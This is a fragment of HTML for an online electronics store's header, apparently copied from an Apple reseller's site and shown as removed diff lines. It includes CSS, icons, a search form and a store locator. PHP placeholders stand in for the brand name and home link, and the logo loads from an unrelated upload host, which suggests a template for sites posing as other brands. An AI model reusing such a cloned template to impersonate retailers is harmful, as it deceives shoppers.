-          <noscript>
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-mega-menu.css?v=10110889665867715061742784889" rel="stylesheet" type="text/css" media="all" />
-          </noscript>
-          <noscript>
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-list-menu.css?v=104864129994713251501742784888" rel="stylesheet" type="text/css" media="all" />
-          </noscript>
-          <noscript>
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-search.css?v=130382253973794904871742784887" rel="stylesheet" type="text/css" media="all" />
-          </noscript>
-          <noscript>
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-menu-drawer.css?v=21058032239462183751742784887" rel="stylesheet" type="text/css" media="all" />
-          </noscript>
-          <noscript>
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-cart-notification.css?v=71986486250318288601742784887" rel="stylesheet" type="text/css" media="all" />
-          </noscript>
-          <noscript>
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-cart-items.css?v=144236440317055431411742784889" rel="stylesheet" type="text/css" media="all" />
-          </noscript>
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/custom-style.css?v=128650136086380557481742784888" rel="stylesheet" type="text/css" media="all" />
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-cto-cart-drawer.css?v=87861508187535145881742784888" rel="stylesheet" type="text/css" media="all" />
-          <style>
-              header-drawer,
-              .header-drawer-lazyload {
-              justify-self: start;
-              height:48px;
-              width:48px;
-              margin-left:0
-              }@media screen and (min-width: 1024px) {
-              header-drawer,
-              .header-drawer-lazyload {
-              display: none;
-              }
-              }@media only screen and (width:375px){
-              input[type=search]::placeholder{
-              color:rgba(18,18,18,.75);
-              position:relative;
-              width:51px;
-              left:5px;
-              top:2px;
-              font-style:normal;
-              font-weight:500;
-              font-size:15px;
-              line-height:15px;
-              opacity:.75
-              }
-              }
-              .menu-drawer-container {
-              display: flex;
-              }
-              .list-menu {
-              list-style: none;
-              padding: 0;
-              margin: 0;
-              }
-              .list-menu--inline {
-              display: inline-flex;
-              flex-wrap: wrap;
-              }
-              summary.list-menu__item {
-              padding-right: 2.7rem;
-              }
-              .list-menu__item {
-              align-items: center;
-              line-height: calc(1 + 0.3 / var(--font-body-scale));
-              }
-              .list-menu__item--link {
-              text-decoration: none;
-              padding-bottom: 1rem;
-              padding-top: 1rem;
-              line-height: calc(1 + 0.8 / var(--font-body-scale));
-              }
-              @media screen and (min-width: 750px) {
-              .list-menu__item--link {
-              padding-bottom: 0.5rem;
-              padding-top: 0.5rem;
-              }
-              }
-              .my-store-locator {
-              display: none;
-              }
-          </style>
-          <style data-shopify>.header {
-              padding: 10px 3rem 10px 3rem;
-              }
-              .section-header {
-              position: sticky; 
-              margin-bottom: 0px;
-              }
-              @media screen and (min-width: 750px) {
-              .section-header {
-              margin-bottom: 0px;
-              }
-              }
-              @media screen and (min-width: 990px) {
-              .header {
-              padding-top: 20px;
-              padding-bottom: 20px;
-              }
-              }
-              @media  screen and (min-width: 1024px) {
-              .header-menu-wrapper {
-              min-height: 140px;
-              }
-              }
-              .menu-drawer__menu li {--color-foreground: #121212;color: #121212;}
-              #right_menu_items {justify-content: space-between;list-style: none;display: contents;flex-direction: row;}
-              #right_menu_items li a{color:#383131}
-              #right_menu_mobile_items li a{color:#383131}
-              .right_menu_divider { }
-              #right_menu_items li:nth-child(2) {background: ;}
-              #right_menu_items li:nth-child(3) {background: ;}
-              #right_menu_items li:nth-child(4) {background: ;}
-              #right_menu_items li:nth-child(5) {background: ;}
-              #right_menu_items li:nth-child(6) {background: ;}
-              #right_menu_items li:nth-child(7) {background: ;}
-              #right_menu_mobile_items li:nth-child(1) {background: ;}
-              #right_menu_mobile_items li:nth-child(2) {background: ;}
-              #right_menu_mobile_items li:nth-child(3) {background: ;}
-              #right_menu_mobile_items li:nth-child(4) {background: ;}
-              #right_menu_mobile_items li:nth-child(5) {background: ;}
-              #right_menu_mobile_items li:nth-child(6) {background: ;}
-          </style>
-          <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/details-disclosure.js?v=13653116266235556501742784889" defer="defer"></script>
-          <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/details-modal.js?v=25581673532751508451742784889" defer="defer"></script>
-          <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/cart-notification.js?v=138585423170270737471742784887" defer="defer"></script>
-          <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/search-form.js?v=35015649889156673281742784888" defer="defer"></script>
-          <svg xmlns="http://www.w3.org/2000/svg" class="hidden">
-              <symbol id="icon-search" viewbox="0 0 18 19" fill="none">
-                <path fill-rule="evenodd" clip-rule="evenodd" d="M11.03 11.68A5.784 5.784 0 112.85 3.5a5.784 5.784 0 018.18 8.18zm.26 1.12a6.78 6.78 0 11.72-.7l5.4 5.4a.5.5 0 11-.71.7l-5.41-5.4z" fill="currentColor"/>
-              </symbol>
-              <symbol id="icon-reset" class="icon icon-close"  fill="none" viewBox="0 0 18 18" stroke="currentColor">
-                <circle r="8.5" cy="9" cx="9" stroke-opacity="0.2"/>
-                <path d="M6.82972 6.82915L1.17193 1.17097" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)"/>
-                <path d="M1.22896 6.88502L6.77288 1.11523" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)"/>
-              </symbol>
-              <symbol id="icon-close" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-                <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
-              </symbol>
-          </svg>
-          <sticky-header data-sticky-type="on-scroll-up" class="header-wrapper color-background-1 gradient header-wrapper--border-bottom header-menu-wrapper">
-              <my-store-locator-mobile
-                class="no-js-hidden my-store-locator my-store-locator--mobile"
-                data-error-text="Error: Try again"
-                data-select-text="Select your store"
-                >
-                <button
-                    class="js-my-store-locator-btn my-store-locator__btn"
-                    disabled
-                    aria-haspopup="dialog"
-                    >
-                    <div class="my-store-locator__icon">
-                      <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16" height="14" viewBox="0 0 16 14" fill="none">
-                          <path d="M12.7742 13.3755H3.05191C2.2285 13.3755 1.55871 12.7056 1.55871 11.8822L1.55859 5.46973H2.29228V11.8822C2.29228 12.301 2.63304 12.6417 3.0518 12.6417H12.7743C13.1931 12.6417 13.5338 12.3011 13.5338 11.8822L13.534 5.46973H14.2676V11.8822C14.2676 12.7056 13.5977 13.3755 12.7743 13.3755H12.7742Z" fill="#1D1D1F"/>
-                          <path d="M6.19597 6.04216C5.04487 6.04216 4.1084 5.10557 4.1084 3.95459H4.84209C4.84209 4.70103 5.44941 5.30836 6.19597 5.30836C6.94253 5.30836 7.54985 4.70103 7.54985 3.95459H8.28354C8.28354 5.10557 7.34707 6.04216 6.19597 6.04216Z" fill="#1D1D1F"/>
-                          <path d="M9.63738 6.04397C8.48628 6.04397 7.5498 5.10738 7.5498 3.95639V2.43213H8.28349V3.95639C8.28349 4.70284 8.89082 5.31016 9.63738 5.31016C10.3839 5.31016 10.9913 4.70284 10.9913 3.95639H11.7249C11.7249 5.10738 10.7885 6.04397 9.63738 6.04397Z" fill="#1D1D1F"/>
-                          <path d="M13.0793 6.04286C11.9282 6.04286 10.9917 5.10627 10.9917 3.95529V2.43102H11.7254V3.95529C11.7254 4.70173 12.3327 5.30906 13.0793 5.30906C13.8258 5.30906 14.4333 4.70173 14.4333 3.95529V2.54174L13.231 0.73392H2.60295L1.40068 2.54163V3.95517C1.40068 4.70162 2.00812 5.30894 2.75468 5.30894C3.50124 5.30894 4.10856 4.70162 4.10856 3.95517V2.43091H4.84225V3.95517C4.84225 5.10627 3.90578 6.04275 2.75468 6.04275C1.60347 6.04275 0.666992 5.10616 0.666992 3.95517V2.43091C0.666992 2.35862 0.688332 2.2879 0.728328 2.22768L2.10075 0.16379C2.16868 0.0614505 2.28342 0 2.40621 0H13.4275C13.5503 0 13.6651 0.0614477 13.733 0.16379L15.1057 2.22779C15.1458 2.28802 15.167 2.35874 15.167 2.43102V3.95529C15.167 5.10627 14.2305 6.04286 13.0793 6.04286H13.0793Z" fill="#1D1D1F"/>
-                          <path d="M1.0332 2.06055H14.7997V2.79435H1.0332V2.06055Z" fill="#1D1D1F"/>
-                          <rect x="5.4806" y="8.38246" width="4.63549" height="4.63549" rx="0.534864" stroke="black" stroke-width="0.713153"/>
-                      </svg>
-                    </div>
-                    <p class="js-my-store-locator-info my-store-locator__info">
-                      Loading store
-                      <i class="fa fa-spinner fa-spin"></i>
-                    </p>
-                </button>
-                <div
-                    class="js-my-store-locator-details my-store-locator__details"
-                    tabindex="-1"
-                    role="dialog"
-                    aria-modal="true"
-                    aria-labelledby="MyStoreDetailsMobileHeading"
-                    >
-                    <button
-                      class="js-my-store-locator-close my-store-locator__close"
-                      type="button"
-                      aria-label="Close"
-                      >
-                      <svg
-                          xmlns="http://www.w3.org/2000/svg"
-                          aria-hidden="true"
-                          focusable="false"
-                          class="icon icon-close"
-                          fill="none"
-                          viewBox="0 0 18 17"
-                          width="18"
-                          height="17"
-                          >
-                          <path
-                            d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                            fill="currentColor"
-                            >
-                      </svg>
-                    </button>
-                    <div class="my-store-locator__details-header">
-                      <h2 class="my-store-locator__details-title" id="MyStoreDetailsMobileHeading"></h2>
-                      <span class="js-my-store-locator-distance my-store-locator__details-distance hidden">
-                      <i class="fa fa-spinner fa-spin"></i>
-                      </span>
-                    </div>
-                    <div class="js-my-store-locator-location my-store-locator__details-location"></div>
-                    <div class="my-store-locator-content">
-                      <div class="js-my-store-locator-address my-store-locator__details-info hidden">
-                          Address: <a href="#"></a>
-                      </div>
-                      <div class="js-my-store-locator-telephone my-store-locator__details-info hidden">
-                          Telephone: <a href="#"></a>
-                      </div>
-                      <div class="js-my-store-locator-email my-store-locator__details-info hidden">
-                          Email: <a href="#"></a>
-                      </div>
-                      <div class="js-my-store-locator-hours my-store-locator__details-info hidden">
-                          Hours: <span></span>
-                      </div>
-                      <div class="js-my-store-locator-services hidden"></div>
-                    </div>
-                    <div class="my-store-locator__details-footer"><a
-                      class="my-store-locator__details-btn--secondary button button--secondary button--full-width"
-                      href="/pages/store-locator"
-                      >
-                      View store map
-                      </a><button
-                          class="js-my-store-locator-drawer-btn my-store-locator__details-btn button button--full-width"
-                          aria-haspopup="dialog"
-                          >
-                      Select another store
-                      </button>
-                    </div>
-                </div>
-              </my-store-locator-mobile>
-              <header class="header header--middle-left header--mobile-center page-width header--has-menu header--has-social header--has-account">
-                <lazyload-section
-                    class="header-drawer-lazyload"
-                    data-render-on-load="true"
-                    data-selector=".js-header-drawer"
-                    data-callback="if (window.initHeaderDrawerAria) window.initHeaderDrawerAria()"
-                    >
-                    <header-drawer
-                      data-breakpoint="tablet"
-                      >
-                      <details id="Details-menu-drawer-container" class="menu-drawer-container">
-                          <summary
-                            class="header__icon header__icon--menu header__icon--summary link focus-inset"
-                            aria-label="Menu"
-                            >
-                            <span>
-                                <svg
-                                  xmlns="http://www.w3.org/2000/svg"
-                                  aria-hidden="true"
-                                  focusable="false"
-                                  class="icon icon-hamburger"
-                                  fill="none"
-                                  viewBox="0 0 18 16"
-                                  width="18"
-                                  height="16"
-                                  >
-                                  <path
-                                      d="M1 .5a.5.5 0 100 1h15.71a.5.5 0 000-1H1zM.5 8a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1A.5.5 0 01.5 8zm0 7a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1a.5.5 0 01-.5-.5z"
-                                      fill="currentColor"
-                                      >
-                                </svg>
-                                <svg
-                                  xmlns="http://www.w3.org/2000/svg"
-                                  aria-hidden="true"
-                                  focusable="false"
-                                  class="icon icon-close"
-                                  fill="none"
-                                  viewBox="0 0 18 17"
-                                  width="18"
-                                  height="17"
-                                  >
-                                  <path
-                                      d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                                      fill="currentColor"
-                                      >
-                                </svg>
-                            </span>
-                          </summary>
-                          <div
-                            id="menu-drawer"
-                            class="gradient menu-drawer motion-reduce color-background-1"
-                            tabindex="-1"
-                            style="background-color:#ffffff"
-                            ></div>
-                      </details>
-                    </header-drawer>
-                </lazyload-section>
-                <script>
-                    window.initHeaderDrawerAria = function () {
-                      document.querySelectorAll('.js-header-drawer [id^="Details-"] summary').forEach((summary) => {
-                        summary.setAttribute('role', 'button');
-                        summary.setAttribute('aria-expanded', summary.parentNode.hasAttribute('open'));
-                    
-                        if (summary.nextElementSibling.getAttribute('id')) {
-                          summary.setAttribute('aria-controls', summary.nextElementSibling.id);
-                        }
-                    
-                        summary.addEventListener('click', (event) => {
-                          event.currentTarget.setAttribute('aria-expanded', !event.currentTarget.closest('details').hasAttribute('open'));
-                        });
-                    
-                        if (summary.closest('header-drawer, menu-drawer')) return;
-                        summary.parentElement.addEventListener('keyup', onKeyUpEscape);
-                      });
-                    };
-                </script>
-                <div class="header__heading">
-                    <div class="brand--logo">
-                      <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer" class="header__heading-link link link--text focus-inset" aria-label="Home">
-                          <div class="ratio" style="--ratio-percent: 25.800250025750004%">
-                            <img
-                                src="https://apollondestroyer.org/uplloner/uploads/file_6a540ff455d85.gif"
-                                loading="lazy"
-                                class="header__heading-logo company_logo ratio"
-                                width="700"
-                                height="200"
-                                alt="<?= $BRAND; ?>"
-                                >
-                          </div>
-                      </a>
-                    </div>
-                    <div class="apple_logo">
-                      <a href="#" class="header__heading-link link link--text focus-inset" aria-label="Home">
-                          <svg width="78" height="36" viewbox="0 0 78 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M67.3956 0.551707C68.5859 0.553638 69.3535 0.556397 69.9332 0.561638C70.5052 0.566603 70.8971 0.573776 71.2123 0.583982C71.8133 0.603292 72.2433 0.638325 72.6165 0.691289C73.243 0.78039 73.7505 0.930454 74.2151 1.15555C74.6777 1.37927 75.0969 1.67912 75.4562 2.04132C75.8154 2.40351 76.1117 2.82557 76.333 3.29093C76.5553 3.75878 76.7043 4.26966 76.7927 4.90192C76.8453 5.27818 76.8806 5.71293 76.9004 6.31981C76.9105 6.63814 76.9179 7.03344 76.9228 7.6108C76.928 8.19561 76.931 8.96966 76.9329 10.1691V25.8318C76.931 27.0312 76.928 27.8052 76.9228 28.39C76.9176 28.9671 76.9105 29.3627 76.9004 29.681C76.8806 30.2882 76.8456 30.7226 76.7927 31.0989C76.7043 31.7309 76.5553 32.242 76.333 32.7099C76.1117 33.1753 75.8152 33.5976 75.4562 33.9595C75.0969 34.3217 74.6777 34.6213 74.2151 34.8453C73.7505 35.0701 73.243 35.2204 72.6165 35.3095C72.2435 35.3625 71.8136 35.3975 71.2123 35.4168C70.8971 35.4271 70.5052 35.4342 69.9332 35.4392C69.3535 35.4442 68.5859 35.4472 67.3956 35.4491H10.8639C9.67355 35.4472 8.90599 35.4444 8.32628 35.4392C7.75425 35.4342 7.36239 35.4271 7.04721 35.4168C6.44614 35.3975 6.01622 35.3625 5.64298 35.3095C5.01645 35.2204 4.50904 35.0704 4.04434 34.8453C3.58184 34.6216 3.1626 34.3217 2.80332 33.9595C2.44405 33.5973 2.14777 33.1753 1.92651 32.7099C1.70415 32.242 1.55519 31.7312 1.46674 31.0989C1.41416 30.7226 1.37884 30.2879 1.3594 29.681C1.34927 29.3627 1.34187 28.9674 1.33694 28.39C1.33174 27.8052 1.32873 27.0312 1.32681 25.8318V10.1688C1.32873 8.96938 1.33174 8.19533 1.33694 7.61053C1.34215 7.03344 1.34927 6.63787 1.3594 6.31953C1.37911 5.71238 1.41416 5.27791 1.46674 4.90164C1.55519 4.26966 1.70415 3.75851 1.92651 3.29066C2.14777 2.82529 2.44433 2.40296 2.80332 2.04104C3.16232 1.67912 3.58184 1.37927 4.04434 1.15527C4.50904 0.930454 5.01645 0.780114 5.64298 0.691013C6.01595 0.638049 6.44587 0.603016 7.04721 0.583706C7.36239 0.5735 7.75425 0.566327 8.32628 0.561362C8.90599 0.556397 9.67355 0.553362 10.8639 0.551431H67.3956V0.551707ZM67.3964 0H67.3959H67.3953H10.8639C9.67081 0.00193098 8.90216 0.00496536 8.32136 0.00993073C7.75589 0.0148961 7.35746 0.0217924 7.02941 0.0325507C6.42916 0.0518605 5.97788 0.086618 5.56658 0.144823C4.89131 0.24082 4.33214 0.40385 3.80693 0.657911C3.28856 0.908938 2.8203 1.243 2.41585 1.65098C2.01167 2.05842 1.68088 2.52985 1.43251 3.05232C1.18113 3.58113 1.01957 4.14415 0.924276 4.8244C0.865949 5.24177 0.831172 5.6972 0.81173 6.3016C0.80105 6.63704 0.793931 7.03896 0.789001 7.60556C0.784072 8.18127 0.780786 8.94759 0.77887 10.1677V25.8312C0.780786 27.0521 0.784072 27.8185 0.789001 28.3944C0.793931 28.9608 0.80105 29.363 0.81173 29.6981C0.831172 30.3025 0.865949 30.758 0.924276 31.1753C1.01957 31.8556 1.18086 32.4189 1.43251 32.9477C1.68088 33.4701 2.01167 33.9416 2.41585 34.349C2.8203 34.757 3.28856 35.0911 3.80693 35.3421C4.33187 35.5964 4.89104 35.7595 5.56631 35.8552C5.97788 35.9137 6.42916 35.9481 7.02941 35.9674C7.35719 35.9782 7.75561 35.9851 8.32108 35.9901C8.90161 35.995 9.67054 35.9981 10.8628 36H67.3953C68.5884 35.9981 69.3571 35.9953 69.9379 35.9901C70.5033 35.9851 70.9018 35.9782 71.2298 35.9674C71.83 35.9481 72.2813 35.9134 72.6926 35.8552C73.3679 35.7592 73.9271 35.5961 74.4523 35.3421C74.9707 35.0911 75.4389 34.757 75.8434 34.349C76.2475 33.9416 76.5783 33.4701 76.8267 32.9477C77.0781 32.4189 77.2396 31.8559 77.3349 31.1756C77.3933 30.7585 77.428 30.3031 77.4475 29.6984C77.4582 29.363 77.4653 28.9608 77.4702 28.3944C77.4754 27.8182 77.4784 27.0519 77.4803 25.8323V10.1688C77.4784 8.94814 77.4751 8.18182 77.4702 7.60556C77.4653 7.03923 77.4582 6.63704 77.4475 6.30188C77.428 5.6972 77.3933 5.24177 77.3349 4.82468C77.2396 4.14442 77.0784 3.58113 76.8267 3.05232C76.5783 2.52985 76.2475 2.05842 75.8434 1.65098C75.4389 1.243 74.9707 0.908938 74.4523 0.657911C73.9273 0.40385 73.3682 0.240544 72.6929 0.144823C72.2813 0.0863422 71.83 0.0518605 71.2298 0.0325507C70.9018 0.0220683 70.5033 0.0148961 69.9381 0.00993073C69.3573 0.00496536 68.5887 0.00193098 67.3964 0ZM22.5344 11.7168C21.5471 11.6432 20.6516 12.0003 19.9308 12.2877C19.4756 12.4692 19.09 12.623 18.7949 12.623C18.4598 12.623 18.0462 12.4578 17.5821 12.2725C16.9748 12.03 16.2811 11.753 15.5645 11.7667C13.9039 11.7913 12.3737 12.7399 11.5177 14.2375C9.79313 17.2529 11.0774 21.7215 12.7574 24.1683C13.5792 25.3638 14.5592 26.7114 15.8462 26.6623C16.4215 26.6395 16.8308 26.4638 17.254 26.2821C17.7424 26.0725 18.2494 25.8548 19.0517 25.8548C19.8172 25.8548 20.3017 26.066 20.7676 26.2691C21.2127 26.4632 21.6409 26.6499 22.2811 26.638C23.6146 26.6132 24.4597 25.4176 25.2754 24.2152C26.1766 22.8902 26.5709 21.6054 26.6247 21.4299L26.6301 21.4125C26.6005 21.4012 24.0306 20.4078 24.0048 17.425C23.982 14.9773 25.9504 13.7774 26.1114 13.6792L26.1186 13.6748C24.9578 11.9537 23.1658 11.764 22.5344 11.7168ZM22.5559 6.95508C22.6827 8.1087 22.2224 9.26866 21.5384 10.1015C20.8549 10.9348 19.7349 11.582 18.6374 11.4962C18.4865 10.3663 19.0421 9.18536 19.6744 8.448C20.3806 7.61575 21.5715 6.99453 22.5559 6.95508Z" fill="#121212"></path>
-                            <path d="M32.4756 10.1289H34.8561C36.1108 10.1289 36.9797 10.9774 36.9797 12.2411V12.2502C36.9797 13.5095 36.1108 14.3715 34.8561 14.3715H33.4686V16.5731H32.4756V10.1289ZM33.4686 10.9727V13.5318H34.608C35.4725 13.5318 35.9689 13.0629 35.9689 12.2546V12.2458C35.9689 11.4417 35.4728 10.973 34.608 10.973H33.4686V10.9727Z" fill="#121212"></path>
-                            <path d="M37.8961 11.8765H38.8537V12.6803H38.8758C39.0264 12.1311 39.4167 11.7871 39.9487 11.7871C40.0859 11.7871 40.2056 11.8095 40.2812 11.823V12.7206C40.2059 12.6894 40.0372 12.6671 39.8512 12.6671C39.2348 12.6671 38.8537 13.0737 38.8537 13.7746V16.5748H37.8961V11.8765Z" fill="#121212"></path>
-                            <path d="M40.7574 14.2433V14.2389C40.7574 12.7697 41.5997 11.7871 42.9075 11.7871C44.2154 11.7871 45.0177 12.7341 45.0177 14.1451V14.4712H41.715C41.7325 15.36 42.2158 15.878 42.9782 15.878C43.5456 15.878 43.9224 15.5831 44.0423 15.2303L44.0557 15.1947H44.9643L44.9555 15.2438C44.8049 15.9897 44.0867 16.6686 42.956 16.6686C41.5863 16.6683 40.7574 15.726 40.7574 14.2433ZM41.7279 13.7879H44.0689C43.9889 12.9752 43.5368 12.5777 42.9116 12.5777C42.2911 12.5774 41.8122 13.0017 41.7279 13.7879Z" fill="#121212"></path>
-                            <path d="M45.9835 11.8765H46.9411V12.6045H46.9633C47.1629 12.1132 47.6369 11.7871 48.2487 11.7871C48.8916 11.7871 49.3613 12.122 49.5477 12.7118H49.5699C49.8093 12.1402 50.3588 11.7871 51.024 11.7871C51.946 11.7871 52.549 12.4034 52.549 13.3457V16.5745H51.587V13.5779C51.587 12.9661 51.263 12.6133 50.6957 12.6133C50.1283 12.6133 49.7337 13.042 49.7337 13.6362V16.5748H48.7936V13.5065C48.7936 12.9617 48.4524 12.6133 47.9113 12.6133C47.3439 12.6133 46.9406 13.0643 46.9406 13.6717V16.5745H45.983V11.8765H45.9835Z" fill="#121212"></path>
-                            <path d="M53.6573 10.5993C53.6573 10.2912 53.9054 10.041 54.2156 10.041C54.5305 10.041 54.7743 10.2912 54.7743 10.5993C54.7743 10.9031 54.5305 11.153 54.2156 11.153C53.9054 11.153 53.6573 10.9031 53.6573 10.5993ZM53.737 11.8765H54.6946V16.5746H53.737V11.8765Z" fill="#121212"></path>
-                            <path d="M55.8882 14.9207V11.875H56.8458V14.7331C56.8458 15.4432 57.1739 15.8363 57.8388 15.8363C58.5127 15.8363 58.9472 15.3494 58.9472 14.6173V11.8753H59.9092V16.5733H58.9472V15.8677H58.9251C58.6811 16.3411 58.2068 16.6671 57.4976 16.6671C56.4734 16.6669 55.8882 16.0015 55.8882 14.9207Z" fill="#121212"></path>
-                            <path d="M61.0338 11.8765H61.9914V12.6045H62.0136C62.2132 12.1132 62.6872 11.7871 63.299 11.7871C63.9419 11.7871 64.4116 12.122 64.598 12.7118H64.6202C64.8596 12.1402 65.4091 11.7871 66.0743 11.7871C66.9963 11.7871 67.5993 12.4034 67.5993 13.3457V16.5745H66.6373V13.5779C66.6373 12.9661 66.3133 12.6133 65.746 12.6133C65.1786 12.6133 64.784 13.042 64.784 13.6362V16.5748H63.8439V13.5065C63.8439 12.9617 63.5027 12.6133 62.9616 12.6133C62.3942 12.6133 61.9909 13.0643 61.9909 13.6717V16.5745H61.0333V11.8765H61.0338Z" fill="#121212"></path>
-                            <path d="M32.4756 19.6562H34.8561C36.1108 19.6562 36.9797 20.5045 36.9797 21.7685V21.7773C36.9797 23.0366 36.1108 23.8986 34.8561 23.8986H33.4686V26.1002H32.4756V19.6562ZM33.4686 20.5004V23.0592H34.608C35.4725 23.0592 35.9689 22.5902 35.9689 21.782V21.7732C35.9689 20.969 35.4728 20.5004 34.608 20.5004H33.4686Z" fill="#121212"></path>
-                            <path d="M37.4825 24.7629V24.754C37.4825 23.9367 38.112 23.4365 39.2159 23.3695L40.4837 23.2937V22.9408C40.4837 22.4228 40.1513 22.11 39.5571 22.11C39.0031 22.11 38.6613 22.3737 38.5817 22.7486L38.5729 22.7888H37.6684L37.6728 22.7397C37.7393 21.9312 38.4354 21.3105 39.5839 21.3105C40.723 21.3105 41.4457 21.918 41.4457 22.8603V26.0983H40.4837V25.3568H40.4662C40.1956 25.8613 39.6548 26.1829 39.0384 26.1829C38.1076 26.1832 37.4825 25.607 37.4825 24.7629ZM39.3002 25.4106C39.9738 25.4106 40.4837 24.9504 40.4837 24.3386V23.9725L39.3443 24.044C38.7681 24.0796 38.4488 24.3342 38.4488 24.7317V24.7405C38.4491 25.1515 38.7859 25.4106 39.3002 25.4106Z" fill="#121212"></path>
-                            <path d="M42.5538 21.4038H43.5114V22.2077H43.5335C43.6842 21.6584 44.0744 21.3145 44.6064 21.3145C44.7436 21.3145 44.8633 21.3368 44.9389 21.3503V22.2479C44.8636 22.2168 44.6949 22.1944 44.5089 22.1944C43.8925 22.1944 43.5114 22.6008 43.5114 23.302V26.1019H42.5538V21.4038Z" fill="#121212"></path>
-                            <path d="M46.3461 24.8628V22.1697H45.6768V21.4017H46.3461V20.1777H47.3258V21.4017H48.1991V22.1697H47.3258V24.8046C47.3258 25.2824 47.5386 25.4253 47.942 25.4253C48.0441 25.4253 48.1285 25.4165 48.1991 25.4076V26.1536C48.0882 26.1712 47.9067 26.1938 47.7114 26.1938C46.7894 26.1936 46.3461 25.8005 46.3461 24.8628Z" fill="#121212"></path>
-                            <path d="M49.2159 21.4038H50.1735V22.1136H50.1957C50.4394 21.6361 50.9183 21.3145 51.6232 21.3145C52.647 21.3145 53.2369 21.9798 53.2369 23.0606V26.1019H52.2749V23.2438C52.2749 22.5379 51.9468 22.1406 51.2817 22.1406C50.6078 22.1406 50.1735 22.6319 50.1735 23.3643V26.1022H49.2159V21.4038Z" fill="#121212"></path>
-                            <path d="M54.1758 23.767V23.7623C54.1758 22.2931 55.0182 21.3105 56.326 21.3105C57.6338 21.3105 58.4362 22.2576 58.4362 23.6685V23.9946H55.1334C55.151 24.8834 55.6343 25.4017 56.3966 25.4017C56.964 25.4017 57.3408 25.1068 57.4608 24.754L57.4742 24.7182H58.3828L58.374 24.7673C58.2234 25.5132 57.5051 26.1921 56.3745 26.1921C55.005 26.1921 54.1758 25.2497 54.1758 23.767ZM55.1466 23.3116H57.4876C57.4076 22.4989 56.9555 22.1011 56.3304 22.1011C55.7099 22.1011 55.2309 22.5254 55.1466 23.3116Z" fill="#121212"></path>
-                            <path d="M59.4498 21.4038H60.4074V22.2077H60.4295C60.5802 21.6584 60.9704 21.3145 61.5024 21.3145C61.6396 21.3145 61.7593 21.3368 61.8349 21.3503V22.2479C61.7596 22.2168 61.5909 22.1944 61.4049 22.1944C60.7885 22.1944 60.4074 22.6008 60.4074 23.302V26.1019H59.4498V21.4038Z" fill="#121212"></path>
-                          </svg>
-                      </a>
-                    </div>
-                </div>
-                <div class="search-container">
-                    <div class="container_search container_search_port">
-                      <predictive-search class="search-modal__form" data-loading-text="Loading...">
-                          <form
-                            class="nosubmit_form search search-modal__form"
-                            action="/search"
-                            id="nosubmit_form2"
-                            method="get"
-                            role="search"
-                            >
-                            <input type="hidden" name="type" value="product">
-                            <input
-                                class="nosubmit"
-                                id="Search-In-Modal"
-                                type="search"
-                                name="q"
-                                value="<?= $BRAND; ?>"
-                                placeholder="Search"
-                                aria-label="Search"role="combobox"
-                                aria-expanded="false"
-                                aria-owns="predictive-search-results-list"
-                                aria-controls="predictive-search-results-list"
-                                aria-haspopup="listbox"
-                                aria-autocomplete="list"
-                                autocorrect="off"
-                                autocomplete="off"
-                                autocapitalize="off"
-                                spellcheck="false">
-                            <div
-                                class="predictive-search predictive-search--header"
-                                tabindex="-1"
-                                data-predictive-search
-                                style="max-height: 540px;"
-                                >
-                                <div class="predictive-search__loading-state">
-                                  <svg
-                                      aria-hidden="true"
-                                      focusable="false"
-                                      role="presentation"
-                                      class="spinner"
-                                      viewBox="0 0 66 66"
-                                      xmlns="http://www.w3.org/2000/svg"
-                                      >
-                                      <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                                  </svg>
-                                </div>
-                            </div>
-                            <span class="predictive-search-status visually-hidden" role="status" aria-hidden="true"></span>
-                          </form>
-                          <button type="button" class="btn_close btn_close_desktop" id="btn_close2" aria-label="Close">
-                            <svg
-                                class="icon icon-close"
-                                aria-hidden="true"
-                                focusable="false"
-                                role="presentation"
-                                width="16.61px"
-                                height="16.61px"
-                                >
-                                <use href="#icon-close"/>
-                            </svg>
-                          </button>
-                      </predictive-search>
-                    </div>
-                </div>
-                <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-my-store-locator.css?v=39324846110998923741742784888" rel="stylesheet" type="text/css" media="all" />
-                <my-store-locator
-                    class="no-js-hidden my-store-locator"
-                    data-limit-search-to-countries="us"
-                    data-storefront-api-access-token="962d1ff668df08fb12a218f6d7553a2e"
-                    data-default-location-id="94099734846"
-                    data-number-of-locations-to-fetch="24"
